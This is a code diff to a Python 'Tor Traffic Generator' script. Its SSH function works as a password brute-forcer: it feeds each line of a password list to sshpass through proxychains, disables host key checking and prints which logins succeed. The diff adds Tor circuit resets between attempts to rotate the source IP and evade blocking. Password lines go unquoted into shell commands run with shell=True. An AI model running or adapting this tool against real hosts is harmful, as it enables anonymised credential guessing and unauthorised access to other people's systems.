@@ -1,8 +1,10 @@
 import os
-from re import T
+import getpass
 import time
 import sys
 import subprocess
+
+enable_tor = False
 
 
 def wccount(filename):
@@ -34,9 +36,11 @@ def create_traffic_ssh():
     print("[*] It will take approximately " + (traffic_count * 5).__str__() + " seconds...")
     time.sleep(2)
     for line in f:
-        # os.system('service tor restart')
-        # time.sleep(2)
-        cmd = "proxychains -q sshpass -p '" + line + "' ssh " + username + "@" + ip + " 'pwd' || echo 'error'"
+        if enable_tor:
+            print("[*] Getting new tor IP.")
+            os.system('service tor restart')
+            time.sleep(1)
+        cmd = "proxychains -q sshpass -p '" + line + "' ssh -o StrictHostKeyChecking=no " + username + "@" + ip + " 'pwd' || echo 'error'"
         result = subprocess.check_output(cmd, shell=True)
 
         temp = result.decode("utf-8")
@@ -45,7 +49,7 @@ def create_traffic_ssh():
             print("Login succesfull with user: " + username + " and password: " + line)
         else:
             print("Login failed with user: " + username + " and password: " + line)
-        time.sleep(2)
+        time.sleep(1)
 
 
 def create_traffic_http():
@@ -53,11 +57,15 @@ def create_traffic_http():
     port = input("Enter the port: ")
     traffic_count = input("Enter the number of traffic: ")
     print("[*] Creating " + traffic_count.__str__() + " traffic...")
-    print("[*] It will take approximately " + (traffic_count * 4).__str__() + " seconds...")
+    #print("[*] It will take approximately " + (traffic_count * 3).__str__() + " seconds...")
+    os.system('service tor restart')
     time.sleep(2)
     i = 0
-    while (i < int(traffic_count)):
-        # os.system('service tor restart')
+    while i < int(traffic_count):
+        if enable_tor:
+            print("[*] Getting new tor IP.")
+            os.system('service tor restart')
+            time.sleep(1)
         cmd = f"proxychains -q curl http://{ip}:{port} || echo 'error'"
         result = subprocess.check_output(cmd, shell=True)
         temp = result.decode("utf-8")
@@ -70,21 +78,34 @@ def create_traffic_http():
 
 
 def mainmenu():
+    global enable_tor
+    if getpass.getuser() != "root":
+        print("[*] You need to be root to run this script!")
+        sys.exit(1)
+
+    print("[*] Welcome to Tor Traffic Generator!")
     print("[1] SSH")
     print("[2] HTTP")
     print("[3] FTP")
     print("[4] SMTP")
     user_input = input("Enter the number of the protocol: ")
-    while (user_input != "1" and user_input != "2" and user_input != "3" and user_input != "4"):
+    while user_input != "1" and user_input != "2" and user_input != "3" and user_input != "4":
         user_input = input("Enter the number of the protocol: ")
 
-    if (user_input == "1"):
+    tor_input = input("Would you like to enable Random Tor IPs y|N: ")
+    if tor_input.__contains__("y"):
+        enable_tor = True
+        print("[*] Random Tor is enabled.")
+        print("[*] Tor will be reloaded every time creating new traffic..")
+    else:
+        print("[*] Random Tor is disabled.")
+        enable_tor = False
+
+    if user_input == "1":
         create_traffic_ssh()
-    elif (user_input == "2"):
+    elif user_input == "2":
         create_traffic_http()
 
 
 if __name__ == '__main__':
     mainmenu()
-
-
